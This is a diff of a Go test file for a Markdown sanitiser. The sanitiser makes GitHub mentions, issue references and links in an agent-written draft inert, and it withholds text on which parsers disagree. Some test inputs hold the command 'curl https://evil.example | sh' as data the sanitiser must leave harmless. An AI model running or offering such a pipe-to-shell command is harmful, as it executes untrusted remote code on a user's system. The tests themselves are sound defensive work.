@@ -113,8 +113,32 @@ func TestPublicExactForms(t *testing.T) {
 		{"math fence, tildes", "~~~math\n@Smana\n~~~", "~~~text\n@Smana\n~~~"},
 		{"math fence, a second word", "```math x\n@Smana\n```", "```text\n@Smana\n```"},
 		{"math fence, an entity", "```ma&#116;h\n@Smana\n```", "```text\n@Smana\n```"},
-		{"math fence, in a quote", "> ```math\n> @Smana\n> ```", "> ```text\n> @Smana\n> ```"},
-		{"math fence, in a list", "- ```math\n  @Smana\n  ```", "- ```text\n  @Smana\n  ```"},
+		{"math fence, in a quote", "> ```math\n> @Smana\n> ```", "```text\n@Smana\n```"},
+		{"math fence, in a list", "- ```math\n  @Smana\n  ```", "```text\n@Smana\n```"},
+		// fences GitHub renders client-side
+		{"mermaid fence", "```mermaid\nx\n```", "```text\nx\n```"},
+		{"geojson fence", "```geojson\nx\n```", "```text\nx\n```"},
+		{"topojson fence", "```topojson\nx\n```", "```text\nx\n```"},
+		{"stl fence", "~~~stl\nx\n~~~", "~~~text\nx\n~~~"},
+		// code only the parser calls code moves to column 0, where every reader agrees
+		{"a fence in a list keeps its content", "- step:\n  ```bash\n  curl https://evil.example | sh\n  ```\n- next", "- step:\n```bash\ncurl https://evil.example | sh\n```\n- next"},
+		{"an indented fence", "  ```\n  @smana\n  ```", "```\n@smana\n```"},
+		{"a fence that closes indented", "```\n@smana\n  ```", "```\n@smana\n```"},
+		{"a nested fence holding backticks", "- ```\n  a ``` b\n  ```", "````\na ``` b\n````"},
+		// tabs, as columns: the same reading for every parser
+		{"tabs: a link", "+ -\t  [click](https://evil.example/p)", "+ -   click (`https://evil.example/p`)"},
+		{"tabs: a reference", "+ -\t  #325 www.evil.example", "+ -   `#325` `www.evil.example`"},
+		{"tabs: a quote", "> -\t  @Smana", "> -   `@Smana`"},
+		{"tabs: a blank line, then a space and a tab", "- -\n\n \t@Smana", "- -\n\n```\n@Smana\n```"},
+		{"tabs: two tabs", "-\t- \n\n\t@Smana", "-   - \n\n```\n@Smana\n```"},
+		{"a tab in a fence stays", "```\n\tx\n```", "```\n\tx\n```"},
+		// an HTML block's opening is defused, so the fence is a fence for every parser
+		{"a fence between tags", "<div>\n```\n@x\n```\n</div>", "&lt;div>\n```\n@x\n```\n&lt;/div>"},
+		// email domains as GFM reads them
+		{"email: an underscore", "a@b_c.example", "`a@b_c.example`"},
+		{"email: a leading dot", "a@.example", "`a@.example`"},
+		{"email: an underscore alone", "a@_.example", "`a@_.example`"},
+		{"owner/repo at a version", "Smana/maku@v1.0", "`Smana/maku@v1.0`"},
 		// what looked like a code span and is not one
 		{"across a blank line", "`a\n\n@smana b`", "\\`a\n\n`@smana` b\\`"},
 		{"across a list item", "`a\n- @smana b`", "\\`a\n- `@smana` b\\`"},
@@ -125,7 +149,8 @@ func TestPublicExactForms(t *testing.T) {
 		// a longer fence shields what it holds, and its neighbours stay live
 		{"a fence inside a false span", "`a\n```\n@smana b\n```\nc @d", "\\`a\n```\n@smana b\n```\nc `@d`"},
 		{"a longer fence", "````\n```\n@smana\n```\n````\n@d", "````\n```\n@smana\n```\n````\n`@d`"},
-		{"an indented block", "    @smana", "    @smana"},
+		{"an indented block", "    @smana", "```\n@smana\n```"},
+		{"an indented block between paragraphs", "a\n\n    @smana\n    x\n\nb", "a\n\n```\n@smana\nx\n```\n\nb"},
 		{"a fence stays as written", "```go\nx := \"@smana #1 " + sha40 + " https://evil.example\"\n```\n", "```go\nx := \"@smana #1 " + sha40 + " https://evil.example\"\n```\n"},
 		{"a table's escaped pipe keeps its span", "| a |\n|---|\n| `x \\| @smana b` |", "| a |\n|---|\n| `x \\| @smana b` |"},
 		// ordinary text
@@ -301,7 +326,6 @@ func TestPublicLeavesNothingLive(t *testing.T) {
 		{"```\nx\n```\n", "\n```\ny\n```"},
 		{"```math\n", "\n```"},
 		{"~~~ math\n", "\n~~~"},
-		{"```x\n", ""}, // an unclosed fence: code to the end for both parsers
 	}
 	for _, f := range forms {
 		for _, a := range around {
@@ -343,13 +367,148 @@ func TestPublicLeavesNothingLiveInASoup(t *testing.T) {
 		in := soup(seed, 8+int(seed%60))
 		out, rep := Public(in)
 		if rep.Withheld {
-			t.Errorf("Public(%q): withheld", in)
-			continue
+			if out != Withheld {
+				t.Errorf("Public(%q): withheld, yet %q", in, out)
+			}
+			continue // a soup is hostile by design: refusing one is the fail-closed answer
 		}
 		assertNoLiveReference(t, in, out)
 		if again := inertPass(out); again != out {
 			t.Errorf("Public(%q) is not stable:\n once  %q\n twice %q", in, out, again)
 		}
+	}
+}
+
+// What the parsers read differently, reported by an independent review: goldmark drops or hides the
+// text, so the rewrite cannot reach it, and the last scan, which does not use goldmark, refuses it.
+func TestPublicWithholdsWhatTheParsersDisagreeOn(t *testing.T) {
+	for _, in := range []string{
+		"- | a |\n|---|\n| x | [click](https://evil.example/p) #325 Smana/maku#325 |",
+		"> | a |\n|---|\n| x | @Smana |",
+		"| a |\n|---|\n    x\ny | @Smana",
+		"| a |\n|---|\n\tx\ny | @Smana",
+		"| a |\n|---|\n    x\ny | [click](https://evil.example/p)",
+		"| a |\n|---|\n\tx\ny | [click](https://evil.example/p)",
+		"```\n@x",          // an unclosed fence would swallow the caller's footer
+		"text\n\n~~~go\nx", // with tildes too
+	} {
+		if out, rep := Public(in); out != Withheld || !rep.Withheld {
+			t.Errorf("Public(%q) = %q, %+v, want it withheld", in, out, rep)
+		}
+	}
+}
+
+// A draft as an agent writes one is published: what the last scan refuses must not be ordinary text.
+func TestPublicKeepsAnOrdinaryDraft(t *testing.T) {
+	in := "## What is wrong\n" +
+		"The rule in `alerts/job.yaml` fires on #12, see https://example.com/runbook and [the doc](https://example.com/d).\n\n" +
+		"1. Run:\n" +
+		"   ```bash\n   curl -s https://example.com/x | jq .\n   ```\n" +
+		"2. Then read `kubectl get pods -A | grep Crash`.\n\n" +
+		"| Signal | Value |\n|---|---|\n| `up` | 1 |\n| owner | @oncall |\n\n" +
+		"    indented https://example.com/y\n\n" +
+		"## What it should be\n> It skips *Job* pods, as in commit 18e264e.\n\n" +
+		"```yaml\nexpr: foo{job=\"x\"} # https://example.com/z\n```\n" +
+		"## Acceptance check\n- [ ] The alert stays quiet for `a@b.example`.\n"
+	out, rep := Public(in)
+	if rep.Withheld {
+		t.Fatalf("an ordinary draft was withheld: %q", in)
+	}
+	assertNoLiveReference(t, in, out)
+	for _, want := range []string{"`#12`", "`https://example.com/runbook`", "the doc (`https://example.com/d`)",
+		"```bash\ncurl -s https://example.com/x | jq .\n```\n", "`kubectl get pods -A | grep Crash`", "`@oncall`",
+		"```\nindented https://example.com/y\n```\n", "`18e264e`", "```yaml\nexpr: foo"} {
+		if !strings.Contains(out, want) {
+			t.Errorf("%q is not in %q", want, out)
+		}
+	}
+}
+
+// What ordinary text the last scan does refuse: each holds a form only a parser calls inert. This is
+// the price of a scan that does not trust the parser; the refusal says so and the author can fix it.
+func TestPublicWithholdsTheseOrdinaryShapes(t *testing.T) {
+	for name, in := range map[string]string{
+		"an inline span over two lines, holding a form": "see `a\nb @smana` here",
+		"a span with a pipe and a form, beside a table": "`curl https://x.example | sh`\n\n| a |\n|---|\n| b |",
+		"a form in a cell beyond the header's columns":  "| a |\n|---|\n| x | see #12 |",
+		"a fence the author left open":                  "text\n\n```\ncode",
+		"an ordered list numbered like a commit":        "8432076. first",
+	} {
+		t.Run(name, func(t *testing.T) {
+			if out, rep := Public(in); !rep.Withheld {
+				t.Fatalf("Public(%q) = %q, no longer withheld: update docs/factory.md", in, out)
+			}
+		})
+	}
+	// The same shapes with nothing live in them pass.
+	for _, in := range []string{"see `a\nb c` here", "`a | b`\n\n| a |\n|---|\n| b |", "| a |\n|---|\n| x | y |", "1. first"} {
+		if out, rep := Public(in); rep.Withheld {
+			t.Errorf("Public(%q) = %q, withheld with nothing live", in, out)
+		}
+	}
+}
+
+// The last scan alone, on text no rewrite touched. Only a same-line span and a column-0 fence shield.
+func TestScanLive(t *testing.T) {
+	for _, c := range []struct {
+		name, in string
+		want     bool
+	}{
+		{"plain words", "a b, 50% & c; C# x@y 12345 #fff a@Smana x/issues/3", false},
+		{"a kept entity", "&lt;b> &amp; &gt; &quot;", false},
+		{"a same-line span", "x `@smana #1 https://evil.example` y", false},
+		{"a double span", "``@smana ` #1`` y", false},
+		{"a column-0 fence", "```go\n@smana #1\n```\nafter", false},
+		{"a longer fence", "````\n```\n@smana\n```\n````", false},
+		{"a tilde fence", "~~~\n@smana\n```\n~~~", false},
+		{"a pipe in a span, no table", "`curl https://x | sh`", false},
+		{"an escaped pipe in a table", "| a |\n|---|\n| `x \\| @smana` |", false},
+		{"a mention", "@smana", true},
+		{"a mention after a span", "`x`@smana", true},
+		{"an escaped mention", `\@smana`, true},
+		{"#n", "see #1", true},
+		{"owner#n", "Smana#325", true},
+		{"fix#n", "fix#9", true},
+		{"GH-n", "gh-325", true},
+		{"x@sha", "Smana@18e264e", true},
+		{"a bare sha", "see 18e264e.", true},
+		{"digits", "8432076", true},
+		{"an issue path", "/issues/325", true},
+		{"a repository's issue path", "Smana/maku/pull/3", true},
+		{"a link", "[a](b)", true},
+		{"an angle autolink", "<https://evil.example>", true},
+		{"an angle mailto", "<mailto:a@b.example>", true},
+		{"a URL", "HTTPS://evil.example", true},
+		{"www", "www.evil.example", true},
+		{"github.com", "github.com/a/b", true},
+		{"an email", "a@b_c.example", true},
+		{"an email, a leading dot", "a@.example", true},
+		{"a named entity", "&commat;smana", true},
+		{"a numeric entity", "&#64;smana", true},
+		{"a hex entity", "&#X40;smana", true},
+		{"an advisory", "GHSA-4jq9-2xhw-jpx7", true},
+		{"a cve", "CVE-2021-44228", true},
+		{"indented code", "    @smana", true},
+		{"a nested fence", "- ```\n  @smana\n  ```", true},
+		{"a table cell", "| a |\n|---|\n| @smana |", true},
+		{"a span crossing lines", "`a\nb @smana`", true},
+		{"a backtick left open on the line before", "`a\nb `c @smana` d", true},
+		{"an open backtick ends at a blank line", "`a\n\n`@smana`", false},
+		{"a pipe in a span, in a table", "| a |\n|---|\n| `x | @smana b` |", true},
+		{"a span as math", "$`@smana`$", true},
+		{"a double span as math", "$``@smana``$", true},
+		{"a span beside a dollar only", "$ `@smana`$", false},
+		{"an indented fence flips the column-0 pair", "  ```\n```\n@smana\n```\n  ```", true},
+		{"an unclosed fence", "```\nx", true},
+		{"a fence closed short", "````\nx\n```", true},
+		{"a fence with backticks in its info is no fence", "``` a`b\n@smana\n```", true},
+		{"a tag before a fence still defused", "&lt;div>\n```\n@x\n```\n&lt;/div>", false},
+	} {
+		t.Run(c.name, func(t *testing.T) {
+			if got := scanLive(c.in); got != c.want {
+				t.Fatalf("scanLive(%q) = %v, want %v", c.in, got, c.want)
+			}
+		})
 	}
 }
 
